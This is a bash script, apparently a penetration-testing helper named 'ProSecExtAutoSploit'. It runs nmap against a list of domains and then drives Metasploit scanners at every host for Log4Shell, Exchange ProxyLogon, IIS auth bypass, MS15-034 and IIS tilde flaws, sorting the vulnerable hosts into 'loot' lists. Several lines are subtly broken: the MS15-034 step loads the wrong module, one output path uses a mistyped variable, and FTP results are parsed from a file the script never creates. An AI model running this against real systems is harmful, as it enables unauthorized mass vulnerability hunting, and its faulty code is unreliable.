#!/bin/bash

figlet -w 95 ProSecExtAutoSploit

read -e -p 'Path to Resource_script "extern.txt" from hacking Repo: ' RES
if [ -z $RES ]
then
    echo '! > extern.txt missing here: '$RES
    exit 1
fi

read -e -p 'File with Domains for MSF run (no http/https): ' HOSTS
if [ -z $HOSTS ]
then
    echo 'supply File!'
    exit 1
fi

read -e -p 'Where to save? (no end / ) will create "output" folder inside: ' FOLDER
if [[ -z $FOLDER || $FOLDER == "." || $FOLDER == "./" ]] 
then
	FOLDER=$PWD
    echo -e '! > Folder is '$FOLDER
else
	if [ ! -d $FOLDER ]
	then
		mkdir -p $FOLDER
		echo -e '! > Folder Created at '$FOLDER
	else
		echo -e '! > Folder OK!'
	fi
fi

mkdir -p $FOLDER/output/msf $FOLDER/output/nmap

read -p "Enter Workspace Name (will delete if exists): " WS
if [ -z $WS ]
then
    WS=new
    echo 'Workspace will be '$WS
fi

echo 'workspace -d ' $WS > $FOLDER/output/msf/workspace.txt
echo 'workspace -a ' $WS >> $FOLDER/output/msf/workspace.txt
echo 'db_import '$FOLDER'/output/nmap/service.xml' >> $FOLDER/output/msf/workspace.txt

nmap -sSV -n -Pn --max-retries 5 -oA $FOLDER/output/nmap/service -iL $HOSTS  > /dev/null 2>&1

#MSF Resource File
printf '%ssetg THREADS 150\nset VERBOSE true\n' > $FOLDER/output/msf/resource.txt
#log4shell
printf '%s\nspool '$FOLDER'/output/msf/log4j.txt\necho "log4j"\nuse auxiliary/scanner/http/log4shell_scanner\n' >> $FOLDER/output/msf/resource.txt
awk '// {printf"\nset rhosts "$1"\nset vhost "$1"\nset rport 80\nrun\nsleep 5\nset rport 8080\nrun\nsleep 5\nset ssl true\nset rport 443\nrun\nsleep5\nset rport 8443\n"}' $HOSTS >> $FOLDER/output/msf/resource.txt
#proxyshell
printf '%s\nspool '$FOLDER'/output/msf/mail.txt\necho "ProxyShell"\nuse auxiliary/scanner/http/exchange_proxylogon\n' >> $FOLDER/output/msf/resource.txt
awk '// {printf"\nset rhosts "$1"\nset vhost "$1"\nrun\nsleep 5\n"}' $HOSTS >> $FOLDER/output/msf/resource.txt
#IIS_Bypass
printf '%s\nspool '$FOLDER'/output/msf/web.txt\necho "IIS_Auth_Bypass"\nuse auxiliary/admin/http/iis_auth_bypass\n' >> $FOLDER/output/msf/resource.txt
awk '// {printf"\nset rhosts "$1"\nset vhost "$1"\nrun\nsleep 5\n"}' $HOSTS >> $FOLDER/output/msf/resource.txt
#IIS_ms15-034
printf '%s\necho "IIS_ms15_034"\nuse auxiliary/admin/http/iis_auth_bypass\n' >> $FOLDER/output/msf/resource.txt
awk '// {printf"\nset rhosts "$1"\nset vhost "$1"\nrun\nsleep 5\n"}' $HOSTS >> $FOLDER/output/msf/resource.txt
#IIS_Internal_IP
printf '%s\necho "IIS_Internal_IP"\nuse auxiliary/scanner/http/iis_internal_ip\n' >> $FOLDER/output/msf/resource.txt
awk '// {printf"\nset rhosts "$1"\nset vhost "$1"\nrun\nsleep 5\n"}' $HOSTS >> $FOLDER/output/msf/resource.txt
#iis_tilde
printf '%s\nspool '$FOLDER'/output/msf/iis_tilde.txt\necho "IIS_Tilde"\nuse auxiliary/scanner/http/iis_shortname_scanner\n' >> $FOLDER/output/msf/resource.txt
awk '// {printf"\nset rhosts "$1"\nset vhost "$1"\nset rport 80\nrun\nsleep 5\nset ssl true\nset rport 443\nrun\nsleep 5\n"}' $HOSTS >> $FOLDER/output/msf/resource.txt
#MSF Resource File End
printf '%s\nspool off\nexit\n' >> /$folder/output/msf/resource.txt

msfdb init
msfconsole -qx "resource "$FOLDER"/output/msf/workspace.txt "$FOLDER"/output/msf/resource.txt"

echo 'looting'

### FTP
mkdir -p $FOLDER/output/extern/ftp/anonymous
awk '/Anonymous READ/ {print$2}' $FOLDER/output/msf/ftp.txt | cut -d ":" -f 1 | sort -u > $FOLDER/output/extern/ftp/anonymous/hosts.txt
mkdir -p $FOLDER/output/extern/ftp/unencrypted
awk '/FTP Banner/ {print$2}' $FOLDER/output/msf/ftp.txt | cut -d ":" -f 1 | sort -u > $FOLDER/output/extern/ftp/unencrypted/hosts.txt

### IIS
mkdir -p $FOLDER/output/extern/web/iis_bypass
grep -B 1 'You can bypass auth' $FOLDER/output/msf/web.txt | awk '/against/ {print$5}' | sort -u > $FOLDER/output/extern/web/iis_bypass/hosts.txt
mkdir -p $FOLDER/output/extern/web/ms15-034
awk '/The target is vulnerable/{print$2}' $FOLDER/output/msf/web.txt | cut -d ":" -f 1 | sort -u > $FOLDER/output/extern/web/ms15-034/hosts.txt
mkdir -p $FOLDER/output/extern/web/iis_tilde
awk '/The target is vulnerable/{print$2}' $FOLDER/output/msf/iis_tilde.txt | cut -d ":" -f 1 | sort -u > $FOLDER/output/extern/web/iis_tilde/hosts.txt

### log4shell
mkdir -p $FOLDER/output/extern/web/log4shell
awk '/Log4Shell found/{print$2}' $FOLDER/output/msf/log4j.txt | cut -d ":" -f 1 | sort -u > $FOLDER/output/extern/web/log4shell/hosts.txt

figlet AllDone!

exit 0
